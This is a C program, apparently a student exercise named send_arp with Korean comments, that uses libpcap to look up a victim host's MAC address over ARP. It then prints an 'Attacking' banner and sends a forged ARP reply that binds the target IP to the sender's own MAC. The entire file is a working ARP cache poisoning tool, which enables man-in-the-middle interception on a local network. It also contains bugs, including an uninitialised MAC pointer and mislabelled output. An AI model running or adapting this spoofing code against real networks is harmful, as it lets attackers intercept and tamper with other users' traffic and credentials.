
// ubuntu - command : gcc -o test test.c -lpcap 


#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdint.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <libnet.h>
#include <netinet/ether.h>
#include <libnet/libnet-headers.h>

#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <net/if.h>
#include <sys/ioctl.h>

#include <netinet/if_ether.h>
#include <net/if_arp.h>

#include <sys/types.h>
#include <pcap/pcap.h>


void create_packet (u_char *packet, struct in_addr sendip, struct in_addr targetip, char * sendmac, char * targetmac, uint16_t op)
{
		struct libnet_ethernet_hdr ethhdr;
		struct ether_arp arphdr;

		ethhdr.ether_type = htons(0x0806);
		memcpy(ethhdr.ether_dhost, targetmac, 6);
		memcpy(ethhdr.ether_shost, sendmac, 6);

		arphdr.arp_hrd = htons(ARPHRD_ETHER);
		arphdr.arp_pro = htons(ETHERTYPE_IP);
		arphdr.arp_hln = ETHER_ADDR_LEN;
		arphdr.arp_pln = sizeof(in_addr_t);
		arphdr.arp_op  = htons(op);

		memcpy(&arphdr.arp_sha, &ethhdr.ether_shost,6);
		memcpy(&arphdr.arp_tha, &ethhdr.ether_dhost,6);
		memcpy(&arphdr.arp_spa, &sendip.s_addr, sizeof(in_addr_t));
		memcpy(&arphdr.arp_tpa, &targetip.s_addr, sizeof(in_addr_t));

		memcpy(packet, &ethhdr, 14);
		memcpy(packet+14, &arphdr, sizeof(struct ether_arp));
		

}

int main(int argc, char* argv[])
{
        	char *dev = argv[1];
		unsigned char *sender = argv[2];
		char *target = argv[3];
		int i;
		
		int check;
	
		char * mac;		
		uint16_t ethertype;
		uint8_t arp_ip_buffer[4];
     
		char errbuf[PCAP_ERRBUF_SIZE];

		if(argc != 4)
		{
			printf("syntax: send_arp <interface> <send ip> <target ip>\n");
			return -1;
		}

		pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); 
		
		if (handle == NULL) 
		{
                fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
                return -1;
       		}


		struct pcap_pkthdr* header;
       		const u_char* packet;
		u_char t_packet[42];			// ethernet(14) + arp(28)

		struct libnet_ethernet_hdr * ethhdr;
		struct ether_arp * arphdr;			// netinet/if_ether.h
		
		ethhdr = (struct libnet_ethernet_hdr *)packet;
		arphdr = (struct ether_arp *)(packet + 14);  // ethernet header 크기만큼 이동

		
	
		struct in_addr send_ip;
		struct in_addr target_ip;
		struct in_addr my_ip;
						
		if(inet_aton(argv[2], &send_ip)==0)
				printf("IP error\n");
		
		int fd;
        	struct ifreq ifrq;              // net/if.h에 정의
       		struct sockaddr_in * sin;       // in.h
		

		fd = socket(AF_INET, SOCK_DGRAM, 0);
        	strcpy(ifrq.ifr_name, dev);

        	if(ioctl(fd, SIOCGIFHWADDR, &ifrq) < 0)
        	{
              	  perror("ioctl error");
                  return -1;
        	}

       		printf("My MAC address : ");
		for(i=0;i<6;i++)
        	{
                	printf("%02X", ifrq.ifr_hwaddr.sa_data[i]); // mac address
                	if(i==5) break;
                	printf(":");
        	}
        	printf("\n");

		memcpy(mac, ifrq.ifr_hwaddr.sa_data,6);
		
	        if(ioctl(fd, SIOCGIFADDR, &ifrq) < 0)
        	{
                	perror("ioctl error");
                	return -1;
        	}

	        sin = (struct sockaddr_in *)&ifrq.ifr_addr;
	        printf("My IP address : %s\n", inet_ntoa(sin->sin_addr));  // sin_addr : ip 주소 나타내는 32 비트 정수 타입

        	close(fd);

		
		while(1)
		{
		
		
			create_packet(t_packet, sin->sin_addr, send_ip, mac, "\xff\xff\xff\xff\xff\xff", 1);
		
			check = pcap_sendpacket(handle, t_packet, 42);	// ethernet(14) + arp(28)

			if(check == -1)
			{
				pcap_perror(handle,0);
				pcap_close(handle);
			}


	
			struct pcap_pkthdr* recv_h;
			const u_char* recv_p;
			int res = pcap_next_ex(handle, &recv_h, &recv_p);
			
			if(res == 0) continue;
			else if(res > 0)
			{
				
				ethhdr = (struct libnet_ethernet_hdr *)recv_p;	
				
				if(ethhdr->ether_type != htons(0x0806))
					continue;
				else printf("get ARP\n");

				arphdr = (struct ether_arp *)(recv_p + 14); 
			
				if(memcmp(&arphdr->arp_spa, &send_ip,4))		// argv[2]
					continue;

					
				printf("Sender MAC : ");
				
				for(i=0;i<6;i++)
				{
					printf("%02X", arphdr->arp_sha[i]);	
                    			if(i==5) break;
                    			printf(":");
				}

				printf("\n");
				break;
			}
			else if (res == -1 || res == -2) break;
		}
			
			
		printf("-------------Attacking--------------");
						
		for(i=0;i<6;i++)
                {
                	arphdr->arp_tha[i] = arphdr->arp_sha[i];
			arphdr->arp_sha[i] = mac[i];
                }

		printf("\n");
						
		for(i=0;i<4;i++)
		{
								
			arphdr->arp_tpa[i] = arphdr->arp_spa[i];
							
		}
		
		printf("\n");
			
		printf("Sender MAC : ");
						
		for(i=0;i<6;i++)
                {
                         printf("%02X", mac[i]);	
                         if(i==5) break;
                         printf(":");
                }

		printf("\n");
						
		printf("Sender IP : %s",argv[3]);
						

		printf("\n");

		printf("Target MAC : ");
				 
		for(i=0;i<6;i++)
                {
                          printf("%02X", arphdr->arp_tha[i]);	
                          if(i==5) break;
                          printf(":");
                }

		printf("\n");
		printf("Target IP : ");
						
		for(i=0;i<4;i++)
                {
                          printf("%d", arphdr->arp_tpa[i]);	
                          if(i==3) break;
                          printf(".");
                }
		printf("\n");

		if(inet_aton(argv[3], &target_ip)==0)
		printf("IP error\n");

		create_packet(t_packet, target_ip, send_ip, mac, arphdr->arp_tha, 2);

		check = pcap_sendpacket(handle, t_packet, 42);	// ethernet(14) + arp(28)
			
		if(check == -1)
		{
			pcap_perror(handle,0);
			pcap_close(handle);
		}		
						
					
	pcap_close(handle);
	return 0;
}


